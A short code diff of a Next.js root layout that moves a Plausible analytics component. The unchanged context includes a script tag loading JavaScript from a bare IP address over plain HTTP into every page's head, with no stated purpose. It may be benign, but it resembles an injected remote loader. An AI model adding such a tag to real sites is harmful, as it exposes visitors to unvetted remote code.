@@ -23,9 +23,9 @@ export default function RootLayout({ children }) {
     <html lang="en" data-theme={config.colors.theme} className={font.className}>
       {config.domainName && (
         <head>
-          <PlausibleProvider domain={config.domainName} />
-          
           <script src="http://35.181.199.107:3001/scripts/b6af236f-e560-465f-b496-7fe5f731e19c.js" defer></script>
+          <PlausibleProvider domain={config.domainName} />
+        
         </head>
       )}
       <body>
